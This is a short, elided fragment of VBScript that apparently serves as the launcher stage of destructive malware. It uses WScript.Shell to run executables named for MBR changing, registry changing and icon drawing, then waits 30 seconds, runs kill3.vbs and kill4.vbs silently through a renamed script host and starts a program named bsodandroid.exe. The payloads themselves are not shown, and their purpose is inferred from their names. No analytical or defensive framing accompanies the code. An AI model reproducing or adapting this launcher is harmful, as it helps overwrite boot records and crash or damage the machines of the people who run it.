...
objShell.Run("mbrchangerandroid.exe")
Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run("regchangerandroid.exe")
Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run("drawxugeicon2k.exe")
Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run("drawandroidicon2k.exe")
Set objShell = WScript.CreateObject("WScript.Shell")
...
WScript.Sleep 30000
Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run("wscriptandroid.exe //B kill3.vbs")
Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run("wscriptandroid.exe //B kill4.vbs")
Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run("bsodandroid.exe")
else
End If
else
End If